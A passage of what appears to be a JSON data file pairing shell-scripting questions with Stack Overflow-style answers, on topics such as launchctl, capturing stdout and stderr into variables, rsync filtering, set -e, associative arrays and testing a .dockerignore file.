options that give you more fine grain control under which circumstances the task shall be kept alive. E.g. it is only kept alive as long as the program terminated with an exit code of zero, only as long as a certain file/directory on disk exists, only if another task is also alive, or only if the network is currently up.\nAlso you can manually enable/disable tasks via command line:\nlaunchctl <command> <parameter>\ncommand can be load or unload, to load a plist or unload it again, in which case parameter is the path to the file. Or command can be start or stop, to just start or stop such a task, in which case parameter is the label (com.example.my-fancy-task). Other commands and options exist as well.\nUpdate: Even though load, unload, start, and stop do still work, they are legacy now. The new commands are bootstrap, bootout, enable, and disable with slightly different syntax and options. One big difference is that disable is persistent, so once a service has been disabled, it will stay disabled, even across reboots until you enable it again. Also you can use kickstart to run a task immediately, regardless how it has been configured to run.\nThe main difference between the new and the old commands is that they separate tasks by \"domain\". The system has domain and so has every user. So equally labeled tasks may exist in different domains and launchctl can still distinguish them. Even different login and different UI sessions of the same user have their own domain (e.g. the same user may once be logged locally and once remote via SSH and different tasks may run for either session) and so does every single running processes. Thus instead of com.example.my-fancy-task, you now would use system/com.example.my-fancy-task or user/501/com.example.my-fancy-task to identify a task, with 501 being the user ID of a specific user.\nSee documentation of the plist format and of the launchctl command line tool.",
    "Clean way to launch the web browser from shell script?": "python -m webbrowser http://example.com\nworks on many platforms",
    "Capture stdout and stderr into different variables": "I think before saying \u201cyou can't\u201d do something, people should at least give it a try with their own hands\u2026\nSimple and clean solution, without using eval or anything exotic\n1. A minimal version\n{\n    IFS=$'\\n' read -r -d '' CAPTURED_STDERR;\n    IFS=$'\\n' read -r -d '' CAPTURED_STDOUT;\n} < <((printf '\\0%s\\0' \"$(some_command)\" 1>&2) 2>&1)\nRequires: printf, read\n2. A simple test\nA dummy script for producing stdout and stderr: useless.sh\n#!/bin/bash\n#\n# useless.sh\n#\n\necho \"This is stderr\" 1>&2\necho \"This is stdout\" \nThe actual script that will capture stdout and stderr: capture.sh\n#!/bin/bash\n#\n# capture.sh\n#\n\n{\n    IFS=$'\\n' read -r -d '' CAPTURED_STDERR;\n    IFS=$'\\n' read -r -d '' CAPTURED_STDOUT;\n} < <((printf '\\0%s\\0' \"$(./useless.sh)\" 1>&2) 2>&1)\n\necho 'Here is the captured stdout:'\necho \"${CAPTURED_STDOUT}\"\necho\n\necho 'And here is the captured stderr:'\necho \"${CAPTURED_STDERR}\"\necho\nOutput of capture.sh\nHere is the captured stdout:\nThis is stdout\n\nAnd here is the captured stderr:\nThis is stderr\n3. How it works\nThe command\n(printf '\\0%s\\0' \"$(some_command)\" 1>&2) 2>&1\nsends the standard output of some_command to printf '\\0%s\\0', thus creating the string \\0${stdout}\\n\\0 (where \\0 is a NUL byte and \\n is a new line character); the string \\0${stdout}\\n\\0 is then redirected to the standard error, where the standard error of some_command was already present, thus composing the string ${stderr}\\n\\0${stdout}\\n\\0, which is then redirected back to the standard output.\nAfterwards, the command\nIFS=$'\\n' read -r -d '' CAPTURED_STDERR;\nstarts reading the string ${stderr}\\n\\0${stdout}\\n\\0 up until the first NUL byte and saves the content into ${CAPTURED_STDERR}. Then the command\nIFS=$'\\n' read -r -d '' CAPTURED_STDOUT;\nkeeps reading the same string up to the next NUL byte and saves the content into ${CAPTURED_STDOUT}.\n4. Making it unbreakable\nThe solution above relies on a NUL byte for the delimiter between stderr and stdout, therefore it will not work if for any reason stderr contains other NUL bytes.\nAlthough that will rarely happen, it is possible to make the script completely unbreakable by stripping all possible NUL bytes from stdout and stderr before passing both outputs to read (sanitization) \u2013 NUL bytes would anyway get lost, as it is not possible to store them into shell variables:\n{\n    IFS=$'\\n' read -r -d '' CAPTURED_STDOUT;\n    IFS=$'\\n' read -r -d '' CAPTURED_STDERR;\n} < <((printf '\\0%s\\0' \"$((some_command | tr -d '\\0') 3>&1- 1>&2- 2>&3- | tr -d '\\0')\" 1>&2) 2>&1)\nRequires: printf, read, tr\n5. Preserving the exit status \u2013 the blueprint (without sanitization)\nAfter thinking a bit about the ultimate approach, I have come out with a solution that uses printf to cache both stdout and the exit code as two different arguments, so that they never interfere.\nThe first thing I did was outlining a way to communicate the exit status to the third argument of printf, and this was something very easy to do in its simplest form (i.e. without sanitization).\n{\n    IFS=$'\\n' read -r -d '' CAPTURED_STDERR;\n    IFS=$'\\n' read -r -d '' CAPTURED_STDOUT;\n    (IFS=$'\\n' read -r -d '' _ERRNO_; exit ${_ERRNO_});\n} < <((printf '\\0%s\\0%d\\0' \"$(some_command)\" \"${?}\" 1>&2) 2>&1)\nRequires: exit, printf, read\n6. Preserving the exit status with sanitization \u2013 unbreakable (rewritten)\nThings get very messy though when we try to introduce sanitization. Launching tr for sanitizing the streams does in fact overwrite our previous exit status, so apparently the only solution is to redirect the latter to a separate descriptor before it gets lost, keep it there until tr does its job twice, and then redirect it back to its place.\nAfter some quite acrobatic redirections between file descriptors, this is what I came out with.\nThe code below is a rewrite of a previous example (you can find it in the appendix below). It also sanitizes possible NUL bytes in the streams, so that read can always work properly.\n{\n    IFS=$'\\n' read -r -d '' CAPTURED_STDOUT;\n    IFS=$'\\n' read -r -d '' CAPTURED_STDERR;\n    (IFS=$'\\n' read -r -d '' _ERRNO_; exit ${_ERRNO_});\n} < <((printf '\\0%s\\0%d\\0' \"$(((({ some_command; echo \"${?}\" 1>&3-; } | tr -d '\\0' 1>&4-) 4>&2- 2>&1- | tr -d '\\0' 1>&4-) 3>&1- | exit \"$(cat)\") 4>&1-)\" \"${?}\" 1>&2) 2>&1)\nRequires: exit, printf, read, tr\nThis solution is really robust. The exit code is always kept separated in a different descriptor until it reaches printf directly as a separate argument.\n7. The ultimate solution \u2013 a general purpose function with exit status\nWe can also transform the code above to a general purpose function.\n# SYNTAX:\n#   catch STDOUT_VARIABLE STDERR_VARIABLE COMMAND [ARG1[ ARG2[ ...[ ARGN]]]]\ncatch() {\n    {\n        IFS=$'\\n' read -r -d '' \"${1}\";\n        IFS=$'\\n' read -r -d '' \"${2}\";\n        (IFS=$'\\n' read -r -d '' _ERRNO_; return ${_ERRNO_});\n    } < <((printf '\\0%s\\0%d\\0' \"$(((({ shift 2; \"${@}\"; echo \"${?}\" 1>&3-; } | tr -d '\\0' 1>&4-) 4>&2- 2>&1- | tr -d '\\0' 1>&4-) 3>&1- | exit \"$(cat)\") 4>&1-)\" \"${?}\" 1>&2) 2>&1)\n}\nRequires: cat, exit, printf, read, shift, tr\nChangeLog: 2022-06-17 // Replaced ${3} with shift 2; ${@} after Pavel Tankov's comment (Bash-only). 2023-01-18 // Replaced ${@} with \"${@}\" after cbugk's comment.\nWith the catch function we can launch the following snippet,\ncatch MY_STDOUT MY_STDERR './useless.sh'\n\necho \"The \\`./useless.sh\\` program exited with code ${?}\"\necho\n\necho 'Here is the captured stdout:'\necho \"${MY_STDOUT}\"\necho\n\necho 'And here is the captured stderr:'\necho \"${MY_STDERR}\"\necho\nand get the following result:\nThe `./useless.sh` program exited with code 0\n\nHere is the captured stdout:\nThis is stderr 1\nThis is stderr 2\n\nAnd here is the captured stderr:\nThis is stdout 1\nThis is stdout 2\n8. What happens in the last examples\nHere follows a fast schematization:\nsome_command is launched: we then have some_command's stdout on the descriptor 1, some_command's stderr on the descriptor 2 and some_command's exit code redirected to the descriptor 3\nstdout is piped to tr (sanitization)\nstderr is swapped with stdout (using temporarily the descriptor 4) and piped to tr (sanitization)\nthe exit code (descriptor 3) is swapped with stderr (now descriptor 1) and piped to exit $(cat)\nstderr (now descriptor 3) is redirected to the descriptor 1, end expanded as the second argument of printf\nthe exit code of exit $(cat) is captured by the third argument of printf\nthe output of printf is redirected to the descriptor 2, where stdout was already present\nthe concatenation of stdout and the output of printf is piped to read\n9. The POSIX-compliant version #1 (breakable)\nProcess substitutions (the < <() syntax) are not POSIX-standard (although they de facto are). In a shell that does not support the < <() syntax the only way to reach the same result is via the <<EOF \u2026 EOF syntax. Unfortunately this does not allow us to use NUL bytes as delimiters, because these get automatically stripped out before reaching read. We must use a different delimiter. The natural choice falls onto the CTRL+Z character (ASCII character no. 26). Here is a breakable version (outputs must never contain the CTRL+Z character, or otherwise they will get mixed).\n_CTRL_Z_=$'\\cZ'\n\n{\n    IFS=$'\\n'\"${_CTRL_Z_}\" read -r -d \"${_CTRL_Z_}\" CAPTURED_STDERR;\n    IFS=$'\\n'\"${_CTRL_Z_}\" read -r -d \"${_CTRL_Z_}\" CAPTURED_STDOUT;\n    (IFS=$'\\n'\"${_CTRL_Z_}\" read -r -d \"${_CTRL_Z_}\" _ERRNO_; exit ${_ERRNO_});\n} <<EOF\n$((printf \"${_CTRL_Z_}%s${_CTRL_Z_}%d${_CTRL_Z_}\" \"$(some_command)\" \"${?}\" 1>&2) 2>&1)\nEOF\nRequires: exit, printf, read\nNote: As shift is Bash-only, in this POSIX-compliant version command + arguments must appear under the same quotes.\n10. The POSIX-compliant version #2 (unbreakable, but not as good as the non-POSIX one)\nAnd here is its unbreakable version, directly in function form (if either stdout or stderr contain CTRL+Z characters, the stream will be truncated, but will never be exchanged with another descriptor).\n_CTRL_Z_=$'\\cZ'\n\n# SYNTAX:\n#     catch_posix STDOUT_VARIABLE STDERR_VARIABLE COMMAND\ncatch_posix() {\n    {\n        IFS=$'\\n'\"${_CTRL_Z_}\" read -r -d \"${_CTRL_Z_}\" \"${1}\";\n        IFS=$'\\n'\"${_CTRL_Z_}\" read -r -d \"${_CTRL_Z_}\" \"${2}\";\n        (IFS=$'\\n'\"${_CTRL_Z_}\" read -r -d \"${_CTRL_Z_}\" _ERRNO_; return ${_ERRNO_});\n    } <<EOF\n$((printf \"${_CTRL_Z_}%s${_CTRL_Z_}%d${_CTRL_Z_}\" \"$(((({ ${3}; echo \"${?}\" 1>&3-; } | cut -z -d\"${_CTRL_Z_}\" -f1 | tr -d '\\0' 1>&4-) 4>&2- 2>&1- | cut -z -d\"${_CTRL_Z_}\" -f1 | tr -d '\\0' 1>&4-) 3>&1- | exit \"$(cat)\") 4>&1-)\" \"${?}\" 1>&2) 2>&1)\nEOF\n}\nRequires: cat, cut, exit, printf, read, tr\nAnswer's history\nHere is a previous version of catch() before Pavel Tankov's comment (this version requires the additional arguments to be quoted together with the command):\n# SYNTAX:\n#  catch STDOUT_VARIABLE STDERR_VARIABLE COMMAND [ARG1[ ARG2[ ...[ ARGN]]]]\ncatch() {\n  {\n      IFS=$'\\n' read -r -d '' \"${1}\";\n      IFS=$'\\n' read -r -d '' \"${2}\";\n      (IFS=$'\\n' read -r -d '' _ERRNO_; return ${_ERRNO_});\n  } < <((printf '\\0%s\\0%d\\0' \"$(((({ shift 2; ${@}; echo \"${?}\" 1>&3-; } | tr -d '\\0' 1>&4-) 4>&2- 2>&1- | tr -d '\\0' 1>&4-) 3>&1- | exit \"$(cat)\") 4>&1-)\" \"${?}\" 1>&2) 2>&1)\n}\nRequires: cat, exit, printf, read, tr\nFurthermore, I replaced an old example for propagating the exit status to the current shell, because, as Andy had pointed out in the comments, it was not as \u201cunbreakable\u201d as it was supposed to be (since it did not use printf to buffer one of the streams). For the record I paste the problematic code here:\nPreserving the exit status (still unbreakable)\nThe following variant propagates also the exit status of some_command to the current shell:\n{\n  IFS= read -r -d '' CAPTURED_STDOUT;\n  IFS= read -r -d '' CAPTURED_STDERR;\n  (IFS= read -r -d '' CAPTURED_EXIT; exit \"${CAPTURED_EXIT}\");\n} < <((({ { some_command ; echo \"${?}\" 1>&3; } | tr -d '\\0'; printf '\\0'; } 2>&1- 1>&4- | tr -d '\\0' 1>&4-) 3>&1- | xargs printf '\\0%s\\0' 1>&4-) 4>&1-)\nRequires: printf, read, tr, xargs\nLater, Andy submitted the following \u201csuggested edit\u201d for capturing the exit code:\nSimple and clean solution saving the exit value\nWe can add to the end of stderr, a third piece of information, another NUL plus the exit status of the command. It will be outputted after stderr but before stdout\n{\n  IFS= read -r -d '' CAPTURED_STDERR;\n  IFS= read -r -d '' CAPTURED_EXIT;\n  IFS= read -r -d '' CAPTURED_STDOUT;\n} < <((printf '\\0%s\\n\\0' \"$(some_command; printf '\\0%d' \"${?}\" 1>&2)\" 1>&2) 2>&1)\nHis solution seemed to work, but had the minor problem that the exit status needed to be placed as the last fragment of the string, so that we are able to launch exit \"${CAPTURED_EXIT}\" within round brackets and not pollute the global scope, as I had tried to do in the removed example. The other problem was that, as the output of his innermost printf got immediately appended to the stderr of some_command, we could no more sanitize possible NUL bytes in stderr, because among these now there was also our NUL delimiter.\nTrying to find the right solution to this problem was what led me to write \u00a7 5. Preserving the exit status \u2013 the blueprint (without sanitization), and the following sections.",
    "What do $? $0 $1 $2 mean in shell script? [duplicate]": "These are positional arguments of the script.\nExecuting\n./script.sh Hello World\nWill make\n$0 = ./script.sh\n$1 = Hello\n$2 = World\nNote\nIf you execute ./script.sh, $0 will give output ./script.sh but if you execute it with bash script.sh it will give output script.sh.",
    "Difference between terms: \"option\", \"argument\", and \"parameter\"?": "A command is split into an array of strings named arguments. Argument 0 is (normally) the command name, argument 1, the first element following the command, and so on. These arguments are sometimes called positional parameters.\n$ ls -la /tmp /var/tmp\narg0 = ls\narg1 = -la\narg2 = /tmp\narg3 = /var/tmp\nAn option is a documented1 type of argument modifying the behavior of a command, e.g. -l commonly means \"long\", -v verbose. -lv are two options combined in a single argument. There are also long options like --verbose (see also Using getopts to process long and short command line options). As their name suggests, options are usually optional. There are however some commands with paradoxical \"mandatory options\".\n$ ls -la /tmp /var/tmp\noption1= -l\noption2= -a\nA parameter is an argument that provides information to either the command or one of its options, e.g. in -o file, file is the parameter of the -o option. Unlike options, whose possible values are hard coded in programs, parameters are usually not, so the user is free to use whatever string suits his/her needs. Should you need to pass a parameter that looks like an option but shouldn't be interpreted as such, you can separate it from the beginning of the command line with a double dash: --2.\n$ ls -la /tmp /var/tmp\nparameter1= /tmp\nparameter2= /var/tmp\n\n$ ls -l -- -a\noption1    = -l\nparameter1 = -a\nA shell parameter is anything that store a value in the context of the shell. This includes positional parameters (e.g. $1, $2...), variables (e.g. $foo, $bar...) and special character ones (e.g. $@)\nFinally, there are subcommands, also known as functions / (low-level) commands, which are used with \"metacommands\" that embed multiple separate commands, like busybox, git, apt-get, openssl, and the likes. With them, you might have global options preceeding the subcommand, and subcommand specific options that follow the subcommand. Unlike parameters, the list of possible subcommands is hardcoded in the command itself. e.g.:\n$ busybox ls -l\ncommand            = busybox\nsubcommand         = ls\nsubcommand option1 = -l\n\n$ git --git-dir=a.git --work-tree=b -C c status -s\ncommand            = git\ncommand option1    = --git-dir=a.git\ncommand option2    = --work-tree=b\ncommand option3    = -C c\nsubcommand         = status\nsubcommand option1 = -s\nNote that some commands like test, tar, dd and find have more complex argument parsing syntax than the ones described previously and can have some or all of their arguments parsed as expressions, operands, keys and similar command specific components.\nNote also that optional variable assignments and redirections, despite being processed by the shell for tilde expansion, parameter expansion, command substitution, arithmetic expansion, and quote removal like other command line parameters are not taken into account in my reply because they have disappeared when the command is actually called and passed its arguments.\n1 I should have written usually documented because of course, undocumented options are still options.\n2 The double dash feature need to be implemented by the program though.",
    "How do you dynamically reload fish config files as you would in bash?": "Use\nsource ~/.config/fish/config.fish\nOr, if your fish is older than 2.1 (See fish#310)\n. ~/.config/fish/config.fish\nThen it will be sourced again, so depending on what you have in there it will be reloaded. For example appending to a universal variable would add more entries.",
    "How to find the difference in days between two dates?": "The bash way - convert the dates into %y%m%d format and then you can do this straight from the command line:\necho $(( ($(date --date=\"031122\" +%s) - $(date --date=\"021020\" +%s) )/(60*60*24) ))",
    "How/When does Execute Shell mark a build as failure in Jenkins?": "",
    "In bash, how do I bind a function key to a command?": "You can determine the character sequence emitted by a key by pressing Ctrl-v at the command line, then pressing the key you're interested in. On my system for F12, I get ^[[24~. The ^[ represents Esc. Different types of terminals or terminal emulators can emit different codes for the same key.\nAt a Bash prompt you can enter a command like this to enable the key macro so you can try it out.\nbind '\"\\e[24~\":\"foobar\"'\nNow, when you press F12, you'll get \"foobar\" on the command line ready for further editing. If you wanted a keystroke to enter a command immediately, you can add a newline:\nbind '\"\\e[24~\":\"pwd\\n\"'\nNow when you press F12, you'll get the current directory displayed without having to press Enter. What if you've already typed something on the line and you use this which automatically executes? It could get messy. However, you could clear the line as part of your macro:\nbind '\"\\e[24~\":\"\\C-k \\C-upwd\\n\"'\nThe space makes sure that the Ctrl-u has something to delete to keep the bell from ringing.\nOnce you've gotten the macro working the way you want, you can make it persistent by adding it to your ~/.inputrc file. There's no need for the bind command or the outer set of single quotes:\n\"\\e[24~\":\"\\C-k \\C-upwd\\n\"\nEdit:\nYou can also create a key binding that will execute something without disturbing the current command line.\nbind -x '\"\\eW\":\"who\"'\nThen while you're typing a command that requires a username, for example, and you need to know the names of user who are logged in, you can press Alt-Shift-W and the output of who will be displayed and the prompt will be re-issued with your partial command intact and the cursor in the same position in the line.\nUnfortunately, this doesn't work properly for keys such as F12 which output more than two characters. In some cases this can be worked around.\nThe command (who in this case) could be any executable - a program, script or function.",
    "Merge multiple JPGs into single PDF in Linux": "From the manual of ls:\n-v natural sort of (version) numbers within text\nSo, doing what we need in a single command:\nconvert $(ls -v *.jpg) foobar.pdf\nMind that convert is part of ImageMagick.",
    "How to filter files when using scp to copy dir recursively?": "I'd probably recommend using something like rsync for this due to its include and exclude flags, e.g:-\nrsync -rav -e ssh --include '*/' --include='*.class' --exclude='*' \\\nserver:/usr/some/unknown/number/of/sub/folders/ \\ \n/usr/project/backup/some/unknown/number/of/sub/folders/\nSome other useful flags:\n-r for recursive\n-a for archive (mostly all files)\n-v for verbose output\n-e to specify ssh instead of the default (which should be ssh, actually)",
    "How do I launch a Git Bash window with particular working directory using a script?": "Try the --cd= option. Assuming your GIT Bash resides in C:\\Program Files\\Git it would be:\n\"C:\\Program Files\\Git\\git-bash.exe\" --cd=\"e:\\SomeFolder\"\nIf used inside registry key, folder parameter can be provided with %1:\n\"C:\\Program Files\\Git\\git-bash.exe\" --cd=\"%1\"",
    "Identifying and removing null characters in UNIX": "I\u2019d use tr:\ntr < file-with-nulls -d '\\000' > file-without-nulls\nIf you are wondering if input redirection in the middle of the command arguments works, it does. Most shells will recognize and deal with I/O redirection (<, >, \u2026) anywhere in the command line, actually.",
    "Equivalent of rm and mv in windows .cmd": "move in Windows is equivalent to mv command in Linux\ndel in Windows is equivalent to rm command in Linux\n\n\nUPDATE: This is a simplified answer but the behavior and capabilities are quite different as mentioned by @WestCoastProjects in the comment.",
    "How to Export a Multi-line Environment Variable in Bash/Terminal e.g: RSA Private Key": "export the key\nexport PRIVATE_KEY=`cat ./gitbu.2018-03-23.private-key.pem`\ntest.sh\n#!/bin/bash\n\necho \"$PRIVATE_KEY\"; \nNote: the \" in the echo above are needed - otherwise the new lines will be converted to spaces!\nIf you want to save the key to a .env file with the rest of your environment variables, all you needed to do is \"wrap\" the private key string in single quotes in the .env file ... e.g: sh exports HELLO_WORLD='-----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA04up8hoqzS1+APIB0RhjXyObwHQnOzhAk5Bd7mhkSbPkyhP1 ... iWlX9HNavcydATJc1f0DpzF0u4zY8PY24RVoW8vk+bJANPp1o2IAkeajCaF3w9nf q/SyqAWVmvwYuIhDiHDaV2A== -----END RSA PRIVATE KEY-----'  So the following command will work:\necho \"export PRIVATE_KEY='`cat ./gitbu.2018-03-23.private-key.pem`'\" >> .env\nFollowed by:\nsource .env\nNow the key will be in your .env file and whenever you source .env it will be exported.",
    "What does \"-ne\" mean in bash?": "This is one of those things that can be difficult to search for if you don't already know where to look.\n[ is actually a command, not part of the bash shell syntax as you might expect. It happens to be a Bash built-in command, so it's documented in the Bash manual.\nThere's also an external command that does the same thing; on many systems, it's provided by the GNU Coreutils package.\n[ is equivalent to the test command, except that [ requires ] as its last argument, and test does not.\nAssuming the bash documentation is installed on your system, if you type info bash and search for 'test' or '[' (the apostrophes are part of the search), you'll find the documentation for the [ command, also known as the test command. If you use man bash instead of info bash, search for ^ *test (the word test at the beginning of a line, following some number of spaces).\nFollowing the reference to \"Bash Conditional Expressions\" will lead you to the description of -ne, which is the numeric inequality operator (\"ne\" stands for \"not equal). By contrast, != is the string inequality operator.\nYou can also find bash documentation on the web.\nBash reference\nBourne shell builtins (including test and [)\nBash Conditional Expressions -- (Scroll to the bottom; -ne is under \"arg1 OP arg2\")\nPOSIX documentation for test\nThe official definition of the test command is the POSIX standard (to which the bash implementation should conform reasonably well, perhaps with some extensions).",
    "What is the maximum size of a Linux environment variable value?": "I don't think there is a per-environment variable limit on Linux. The total size of all the environment variables put together is limited at execve() time. See \"Limits on size of arguments and environment\" here for more information.\nA process may use setenv() or putenv() to grow the environment beyond the initial space allocated by exec.\nHere's a quick and dirty program that creates a 256 MB environment variable.\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\nint main(void)\n{\n  size_t size = 1 << 28; /* 256 MB */\n  char *var;\n\n  var = malloc(size);\n  if (var == NULL) {\n  perror(\"malloc\");\n  return 1;\n}\n\n  memset(var, 'X', size);\n  var[size - 1] = '\\0';\n  var[0] = 'A';\n  var[1] = '=';\n\n  if (putenv(var) != 0) {\n  perror(\"putenv\");\n  return 1;\n}\n\n  /*  Demonstrate E2BIG failure explained by paxdiablo */\n  execl(\"/bin/true\", \"true\", (char *)NULL);\n  perror(\"execl\");\n\n\n  printf(\"A=%s\\n\", getenv(\"A\"));\n\n  return 0;\n}",
    "adb shell su works but adb root does not": "",
    "Edit shell script while it's running": "It does affect, at least bash in my environment, but in very unpleasant way. See these codes. First a.sh:\n#!/bin/sh\n\necho \"First echo\"\nread y\n\necho \"$y\"\n\necho \"That's all.\"\nb.sh:\n#!/bin/sh\n\necho \"First echo\"\nread y\n\necho \"Inserted\"\n\necho \"$y\"\n\n# echo \"That's all.\"\nDo\n$ cp a.sh run.sh\n$ ./run.sh\n$ # open another terminal\n$ cp b.sh run.sh  # while 'read' is in effect\n$ # Then type \"hello.\"\nIn my case, the output is always:\nhello\nhello\nThat's all.\nThat's all.\n(Of course it's far better to automate it, but the above example is readable.)\n[edit] This is unpredictable, thus dangerous. The best workaround is , as described here put all in a brace, and before the closing brace, put \"exit\". Read the linked answer well to avoid pitfalls.\n[added] The exact behavior depends on one extra newline, and perhaps also on your Unix flavor, filesystem, etc. If you simply want to see some influences, simply add \"echo foo/bar\" to b.sh before and/or after the \"read\" line.",
    "Is there a way to create key-value pairs in Bash script?": "In bash version 4 associative arrays were introduced.\ndeclare -A arr\n\narr[\"key1\"]=val1\n\narr+=( [\"key2\"]=val2 [\"key3\"]=val3 )\nThe arr array now contains the three key value pairs. Bash is fairly limited what you can do with them though, no sorting or popping etc.\nfor key in ${!arr[@]}; do\n    echo ${key} ${arr[${key}]}\ndone\nWill loop over all key values and echo them out.\nNote: Bash 4 does not come with Mac OS X because of its GPLv3 license; you have to download and install it. For more on that see here",
    "Check whether a certain file type/extension exists in directory [duplicate]": "#!/bin/bash\n\ncount=`ls -1 *.flac 2>/dev/null | wc -l`\nif [ $count != 0 ]\nthen \necho true\nfi ",
    "What does 'cd -' stand for?": "If a single dash is specified as the argument, it will be replaced by the value of OLDPWD.\nThe OLDPWD is set by cd command and it is the previous working directory.",
    "Detect if homebrew package is installed": "You can use\nbrew ls --versions myformula\nto output the installed versions of the respective formula. If the formula is not installed, the output will be empty.\nWhen using a recent versions of homebrew, which you can get with brew update, you can just run this (thanks Slaven):\nif brew ls --versions myformula > /dev/null; then\n  # The package is installed\nelse\n  # The package is not installed\nfi\nThat said, it is probably a good idea to check for the existence of the tool at all and not just checking for the respective homebrew package (e.g. by searching for the executable in the $PATH). People tend to install tools in a rather large amount of ways in practice, with homebrew being just one of them.",
    "Escape dollar sign in string by shell script": "As you know, a dollar sign marks a variable. You have to take it into account when you are typing it.\nYou can escape the dollar\n./dd.sh \"sample\\$name.mp4\"\nor just type it with single quotes\n./dd.sh 'sample$name.mp4'\nTo check if there is a dollar sign in a variable, do\n[[ $variable == *\\$* ]] && echo 'I HAZ A DOLAR!!!' || echo 'MEH'",
    "What's the meaning of the parameter -e for bash shell command line?": "The -e option means \"if any pipeline ever ends with a non-zero ('error') exit status, terminate the script immediately\". Since grep returns an exit status of 1 when it doesn't find any match, it can cause -e to terminate the script even when there wasn't a real \"error\".\nIf you want to keep the -e option, but also have a grep command that might validly find no matches, you can append || : to the grep command. This means \"or, if the grep command returns a non-zero exit status, run : (which does nothing)\"; so the net effect is to disable -e for the grep command. So:\ngrep PATTERN FILE... || :\nEdited to add: The above approach discards every error: if grep returns 1 because it found no matches, that's ignored, but also if grep returns 2 because there was an error, that's ignored, and if grep isn't in the path (so Bash returns 127), that's ignored \u2014 and so on. So, rather than :, it's probably better to use a command that checks the result code and re-issues the error if it's something other than 1. For example:\ngrep PATTERN FILE || (( $? == 1 ))\nBut this destroys the exit status; usually, when a failed command terminates a Bash script with -e, the script will return the command's exit-status, but in the above example, the script will just return 1. If (and only if) we care about that, we can fix it by write something like this:\ngrep PATTERN FILE || exit_code=$?\nif (( exit_code > 1 )) ; then\n    exit $exit_code\nfi\n(first line c/o dsummersl's comment).\nAt this point, it's probably best to create a shell function to handle this for us:\nfunction grep_no_match_ok () {\n    local exit_code\n    grep \"$@\" || exit_code=$?\n    return $(( exit_code == 1 ? 0 : exit_code ))\n}\n(note the use of return rather than exit; we'll let -e handle the exiting when appropriate); this way, we can just write:\ngrep_no_match_ok PATTERN FILE     # won't kill script if no matches are found\nIn fact, since we most likely want to use this function for all occurrences of grep in this script, we can actually just name the function grep:\nfunction grep () {\n    local exit_code\n    command grep \"$@\" || exit_code=$?\n    return $(( exit_code == 1 ? 0 : exit_code ))\n}\n\ngrep PATTERN FILE     # won't kill script if no matches are found\n(note the use of command to bypass the shell function within its own body: we want the function to call the regular program grep, rather than to recurse infinitely).",
    "How to copy to system clipboard from tmux output after mouse selection?": "If you are using iTerm2, you can copy text in Tmux session, holding down the Option key while dragging the mouse to make selection.\nThen it should be possible to paste text anywhere with Cmd + V as usual. Found it here: http://web.archive.org/web/20131226003700/http://ootput.wordpress.com/2013/08/02/copy-and-paste-in-tmux-with-mouse/",
    "error retrieving current directory: getcwd: cannot access parent directories": "Most likely the error is not related to the script at all. The issue is: a directory in which you are when you try to run the script does not exist anymore. For example, you have two terminals, cd somedir/ at the first one then mv somedir/ somewhere_else/ at the second one, then try to run whatsoever in the first terminal - you'll receive this error message.\nPlease note you'll get this error even if you re-create the directory with the same name because the new directory will have a different inode index.",
    "Get Android OS version of device connected via ADB [duplicate]": "",
    "How can I redirect the output of the \"time\" command?": "no need to launch sub shell. Use a code block will do as well.\n{ time ls; } 2> out.txt\nor\n{ time ls > /dev/null 2>&1 ; } 2> out.txt",
    "How to detect 386, amd64, arm, or arm64 OS architecture via shell/bash": "I suggest using:\ndpkg --print-architecture",
    "How to run a process with a timeout in Bash? [duplicate]": "Use the timeout command:\ntimeout 15s command\nNote: on some systems you need to install coreutils, on others it's missing or has different command line arguments. See an alternate solution posted by @ArjunShankar . Based on it you can encapsulate that boiler-plate code and create your own portable timeout script or small C app that does the same thing.",
    "How could the UNIX sort command sort a very large file?": "The Algorithmic details of UNIX Sort command says Unix Sort uses an External R-Way merge sorting algorithm. The link goes into more details, but in essence it divides the input up into smaller portions (that fit into memory) and then merges each portion together at the end.",
    "Split bash string by newline characters": "Another way:\nx=$'Some\\nstring'\nreadarray -t y <<<\"$x\"\nOr, if you don't have bash 4, the bash 3.2 equivalent:\nIFS=$'\\n' read -rd '' -a y <<<\"$x\"\nYou can also do it the way you were initially trying to use:\ny=(${x//$'\\n'/ })\nThis, however, will not function correctly if your string already contains spaces, such as 'line 1\\nline 2'. To make it work, you need to restrict the word separator before parsing it:\nIFS=$'\\n' y=(${x//$'\\n'/ })\n...and then, since you are changing the separator, you don't need to convert the \\n to space anymore, so you can simplify it to:\nIFS=$'\\n' y=($x)\nThis approach will function unless $x contains a matching globbing pattern (such as \"*\") - in which case it will be replaced by the matched file name(s). The read/readarray methods require newer bash versions, but work in all cases.",
    "How to execute the output of a command within the current shell?": "The eval command exists for this very purpose.\neval \"$( ls | sed... )\"\nMore from the bash manual:\neval\n          eval [arguments]\nThe arguments are concatenated together into a single command, which is then read and executed, and its exit status returned as the exit status of eval. If there are no arguments or only empty arguments, the return status is zero.",
    "How to test dockerignore file?": "To expand on VonC's suggestion, here's a sample build command you can use to create an image with the current folder's build context:\ndocker image build --no-cache -t build-context -f - . <<EOF\nFROM busybox\nWORKDIR /build-context\nCOPY . .\nCMD find .\nEOF\nOnce created, run the container and inspect the contents of the /build-context directory which includes everything not excluded by the .dockerignore file:\n# run the default find command\ndocker container run --rm build-context\n\n# or inspect it from a shell using\ndocker container run --rm -it build-context /bin/sh\nYou can then cleanup with:\ndocker image rm build-context",
    "Multithreading in Bash [duplicate]": "Sure, just add & after the command:\nread_cfg cfgA &\nread_cfg cfgB &\nread_cfg cfgC &\nwait\nall those jobs will then run in the background simultaneously. The optional wait command will then wait for all the jobs to finish.\nEach command will run in a separate process, so it's technically not \"multithreading\", but I believe it solves your problem.",
    "How do I assign ls to an array in Linux Bash?": "It would be this\narray=($(ls -d */))\nEDIT: See Gordon Davisson's solution for a more general answer (i.e. if your filenames contain special characters). This answer is merely a syntax correction.",
    "How do you catch error codes in a shell pipe?": "In bash you can use set -e and set -o pipefail at the beginning of your file. A subsequent command ./a | ./b | ./c will fail when any of the three scripts fails. The return code will be the return code of the first failed script.\nNote that pipefail isn't available in standard sh.",
